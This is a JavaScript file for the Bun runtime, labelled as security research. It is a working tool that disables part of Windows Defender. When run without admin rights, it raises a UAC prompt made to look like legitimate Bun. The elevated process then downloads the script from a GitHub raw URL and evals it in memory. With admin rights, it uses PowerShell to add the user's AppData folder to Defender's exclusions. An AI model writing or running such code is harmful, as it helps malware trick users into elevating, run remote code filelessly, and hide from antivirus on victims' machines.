// excl.js - Исследование безопасности Jan/Bun (Fileless UAC Elevation)
(async () => {
  // Динамический импорт для совместимости с ESM (без require)
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  // Подключаем Windows API для управления процессами и UAC
  const shell32 = dlopen("shell32.dll", {
    ShellExecuteW: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  // Проверка прав администратора через net.exe
  const checkAdmin = async () => {
    try {
      const p = Bun.spawn({ cmd: ["net", "session"] });
      return (await p.exited) === 0;
    } catch (e) { return false; }
  };

  const is_admin = await checkAdmin();
  console.log(`🚀 PID: ${process.pid} | Admin: ${is_admin}`);

  if (is_admin) {
    console.log("✅ СЕССИЯ АДМИНИСТРАТОРА");
    
    // Путь для исключения (например, %APPDATA% или C:\Temp)
    const target = process.env.APPDATA || process.env.LOCALAPPDATA
    console.log(`🛡️ Добавляем исключение Defender: ${target}`);

    // Используем PowerShell для взаимодействия с защитником (самый надежный API)
    const ps = Bun.spawn({
      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${target}' -ErrorAction Stop; "OK"`],
      stdout: "pipe",
      stderr: "pipe"
    });

    const err = await new Response(ps.stderr).text();
    if (await ps.exited === 0) {
      console.log(`✨ УСПЕХ: Папка ${target} добавлена в исключения.`);
    } else {
      console.log("❌ ОШИБКА:", err.trim());
    }

    console.log("\nНажми Enter для завершения...");
    for await (const line of console) break;
    return;
  }

  // --- РЕКУРСИЯ (Запрос UAC) ---
  console.log("❌ Права ограничены. Запрашиваем повышение через Bun...");
  
  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/excl.js";
  
  // Команда для нового процесса: скачай этот же скрипт и выполни в памяти
  // Используем двойные кавычки для CMD-совместимости
  const payload = `fetch('${url}').then(r=>r.text()).then(eval)`;

  const res = shell32.symbols.ShellExecuteW(
    0, 
    toPtr("runas"),      // Вызываем UAC
    toPtr("bun.exe"),    // В заголовке UAC будет написано "Bun" (выглядит легитимно)
    toPtr(`-e "${payload}"`), // Передаем команду на исполнение
    0, 
    1
  );

  if (res > 32) {
    console.log("🔄 UAC подтвержден. Старый процесс завершается.");
    process.exit(0);
  } else {
    console.log("⚠️ Ошибка вызова UAC или отказ пользователя:", res);
  }
})();
